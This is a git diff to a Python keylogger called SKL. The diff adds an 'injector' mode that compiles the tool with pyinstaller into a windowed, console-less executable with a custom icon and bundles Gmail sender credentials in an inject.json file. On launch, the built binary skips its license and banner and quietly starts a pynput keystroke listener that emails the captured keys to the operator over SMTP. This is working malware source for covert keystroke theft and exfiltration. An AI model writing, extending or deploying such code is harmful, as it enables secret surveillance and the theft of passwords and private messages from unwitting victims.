@@ -46,6 +46,15 @@ keys = []
 keys_pressed = 0
 
 
+#!# -----------------------------------INJECTOR RELEATED----------------------------------- #!#
+
+def isInjector():
+    if os.path.exists("inject.json"):
+        return True
+    
+
+
+
 #!# -----------------------------------LICENSE----------------------------------- #!#
 
  
@@ -107,26 +116,26 @@ def license():
     except:
         exit()
         
-
-license()
+if isInjector() != True:
+    license()
     
 
 
 USER = os.getlogin()
 directory = "SKL"
 parent_dir = f"C:/Users/{USER}/AppData/Roaming"
-            
+                
 path = os.path.join(parent_dir, directory)
 try:
         os.mkdir(path)
 except:
-    pass
+        pass
 try:
-    with open(f"{path}/config.json","r") as f:
-         json.load(f)
+        with open(f"{path}/config.json","r") as f:
+            json.load(f)
 except:
-     with open(f"{path}/config.json","w") as f:
-         json.load(f)
+        with open(f"{path}/config.json","w") as r:
+            pass
 
 JsonPath = f"{path}/config.json"
     
@@ -199,12 +208,13 @@ class newConfig():
      
 #!# -----------------------------------LOGGER----------------------------------- #!#
 
-def START_LOGGER():
+def START_LOGGER(senderEmail,senderPassword,receiverEmail):
     from pynput.keyboard import Key, Listener
     import smtplib, ssl
     import socket   
     
-        
+   
+    
     
 
     import requests
@@ -217,13 +227,9 @@ def START_LOGGER():
         return hostname, ip_address
 
 
-    with open(f"{JsonPath}","r") as file:
-        parsed = json.load(file)
-        Jsender_email = parsed["sender_email"]
-        Jsender_password = parsed["sender_password"]
-        Jreceiver_email = parsed["receiver_email"]
 
         mode = parsed['mode']
+        
     Key_mode = True
     Email_mode = False
         
@@ -236,9 +242,9 @@ def START_LOGGER():
     def email(keysGiven):
         port = 465  # For SSL
         smtp_server = "smtp.gmail.com"
-        sender_email = Jsender_email
-        receiver_email = Jreceiver_email  
-        password = Jsender_password
+        sender_email = senderEmail
+        receiver_email = receiverEmail  
+        password = senderPassword
         message = f"""\
             Subject: KEYS 
 
@@ -333,8 +339,8 @@ def check_config():
 
 
 
-
-print("....Welcome to SKL....\nType \"help\" for a list of commands")
+if isInjector() != True:
+    print("....Welcome to SKL....\nType \"help\" for a list of commands")
 
 def __main__():
     print( bcolors.RESET_DIM +bcolors.WARNING + "SKL (Simple Key Logger)")
@@ -380,6 +386,10 @@ def __main__():
     elif CONSOLE.lower() == "compile":
         try:
             
+            
+            
+            
+            
             if check_config() == False:
                 pass
             else:    
@@ -390,8 +400,21 @@ def __main__():
                 print(bcolors.WARNING + "Enter the file path of a logo" + bcolors.DIM + "\nIf you dont have a logo, just type NONE." + bcolors.RESET_DIM)
                 logo = input(bcolors.OKBLUE + "filename: " + bcolors.WHITE)
                 os.rename("SKL.py", filename + ".py")
-                os.system(f"pyinstaller -F  \"{filename}\".py -i {logo}")
+                os.system(f"pyinstaller -F -w \"{filename}\".py -i {logo.upper()}")
                 os.rename(f"{filename}.py", "SKL.py")
+                
+                with open("./dist/inject.json", "w") as f:
+                    with open(f"{JsonPath}", "r") as j:
+                        parsed = json.load(j)
+                        senderEmail = parsed["sender_email"]
+                        senderPassword = parsed["sender_password"]
+                        receiverEmail = parsed["receiver_email"]
+                        mode = parsed["mode"]
+                        configData = {"sender_email": senderEmail, "sender_password": senderPassword,
+                                      "receiver_email": receiverEmail,
+                                      "mode": mode, "Injector": True}
+                        
+                        json.dump(configData,f)
         except:
             print(bcolors.FAIL + "Failed to compile KeyLogger properly.")
     elif CONSOLE.lower() == "test":
@@ -405,15 +428,37 @@ def __main__():
         printlogo()
         print(newConfig.mode())
         
-            
-
-
-
-    
-        
     if return_c == 1:
         bcolors.WHITE
         __main__()
+        
+            
+#!# -----------------------------------INJECTOR----------------------------------- #!#
+
+if os.path.exists("inject.json"):
+    
+    with open(f"inject.json", "r") as Inject:
+        parsed = json.load(Inject)
+        Injector = parsed["Injector"]
+        if Injector == True:
+            with open(f"{JsonPath}", "w") as Config:
+                    JsenderEmail = parsed["sender_email"]
+                    JsenderPassword = parsed["sender_password"]
+                    JreceiverEmail = parsed["receiver_email"]
+                    mode = parsed["mode"]
+                    configData = {"sender_email": JsenderEmail, "sender_password": JsenderPassword,
+                                            "receiver_email": JreceiverEmail,
+                                            "mode": mode}
+                                
+                    json.dump(configData,Config)
+                    START_LOGGER(JsenderEmail,JsenderPassword,JreceiverEmail)
+        else:
+            __main__()
+                    
+                
+
+        
+   
 
 printlogo()
 __main__()
